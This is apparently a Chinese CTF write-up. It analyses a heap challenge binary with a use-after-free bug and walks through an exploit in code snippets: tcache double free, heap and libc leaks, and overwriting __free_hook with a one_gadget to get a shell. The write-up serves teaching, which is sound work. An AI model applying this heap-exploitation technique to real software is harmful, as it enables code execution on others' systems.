### 程序分析

checksec可以看到保护全开

![](../Images/290a9e9b1f6dd3923ef91d30afbeaaf1.png)

在IDA中打开分析程序，可以看到堆题中常见的三个功能：add、show、delete

![](../Images/f369372cb38125768ec1661e9a77ed4e.png)

其中add函数无明显漏洞，但在创建堆块时有做要求，即数量不能大于8、大小不能小于0x80 不能大于0x400

![](../Images/b52095b78ff1c84f0c72ab5954d5cefe.png)

show 函数即正常的打印content中的数据

delete函数中在对堆块free过后，未对其指针进行清零，即出现UAF漏洞

![](../Images/0df96bcb6873f651e39f00861c1d442c.png)

### 利用过程

1.  泄露heap地址
    
    由于前面创建堆块时的种种限制，对此我们可以利用doublefree的方式将堆块申请到tcache中，但前提我们需要先得到堆块的地址
    
    ```
        add(0x80,"a") #idx\_0
        dele(0)
        dele(0)
        show(0)
        sh.recvuntil("Content: ")
        heap\_addr = u64(sh.recv(6).ljust(8,b"\\x00"))\-0x260
        success("heap\_addr => 0x%x",heap\_addr)
    ```
    
2.  控制tcache，泄露libc地址
    
    得到堆块地址后，继续通过doublefree，控制堆块申请到tcache结构体上，同时设置其0x90大小的堆块数量超过7，即可在下一次free该大小的堆块时，使其跳出tcache，从而进入unsortedbin中，进而得到其fd、bk指针中的main\_arena的地址
    
    ```
     add(0x80,p64(heap\_addr))    #idx\_1
        add(0x80,"a")   #idx\_2
        add(0x80,p64(0)+p64(0x250)+p64(0x1000000000000000))#idx\_3
        add(0x90,"b") #下一步用
        dele(1)
        show(1)
        sh.recvuntil("Content: ")
        main\_arena96 = u64(sh.recvuntil(b"\\x7f")\[:6\].ljust(8,b"\\x00"))
        libc\_base = main\_arena96\-96\-0x10\-libc.sym\["\_\_malloc\_hook"\]
        free\_hook = libc\_base + libc.sym\["\_\_free\_hook"\]
        one\_gg = one\_ggs\[1\]+libc\_base
        success("libc\_base => 0x%x",libc\_base)
        success("free\_hook => 0x%x",free\_hook)
        success("one\_gg => 0x%x",one\_gg)
    ```
    
3.  写onegg到freehook
    
    通过上一步创建的0x90的堆块，再次利用doublefree将堆块申请到free\_hook中，并写入one\_gadget即可getshell
    
    ```
        dele(3)
        dele(3)
        add(0x90,p64(free\_hook))
        add(0x90,p64(0))
        add(0x90,p64(one\_gg))
        sh.sendlineafter("Your choice :","3")
        sh.sendlineafter("Index :","3")
    ```
